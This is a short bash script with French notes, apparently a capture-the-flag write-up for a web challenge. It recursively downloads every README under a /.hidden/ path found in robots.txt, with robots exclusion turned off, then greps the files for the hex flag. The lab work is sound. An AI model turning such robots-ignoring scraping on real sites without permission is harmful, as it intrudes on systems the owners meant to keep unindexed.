#!/bin/bash

if [ -z "$1" ]
then
	echo "I need an IP address"
else
	mkdir ./scraped ; cd ./scraped
	wget -np -r -A "README*" -nd -l 0 -e robots=off http://$1/.hidden/
	tmp=`ls | grep README | wc -l`
	index=$(($tmp-1))
	readme="README."
	while [ $index != 0 ]
	do
		file=$readme$index
		str=`cat $file | grep 2`
		printf "%s" $str
		index=$(($index-1))
	done
	str=`cat "README" | grep -E [0-9a-f]{64}`
	printf "%s" $str
fi


- On s'interesse au path /.hidden trouvé précédemment dans le fichier robots.txt

- Il contient un fichier README ainsi des liens vers des sous-répertoire contenant eux-mêmes un fichier README et d'autres sous-répertoire.

- On créer un script pour automatiser le téléchargement de tous les fichiers README présents dans l'arborescence de /.hidden (scraping.sh)

- Celui-ci utilisera la commande wget de manière récursive en récupérant uniquement les fichiers README.

- On affiche ensuite le contenu des fichiers en isolant le flag grâce à une regex.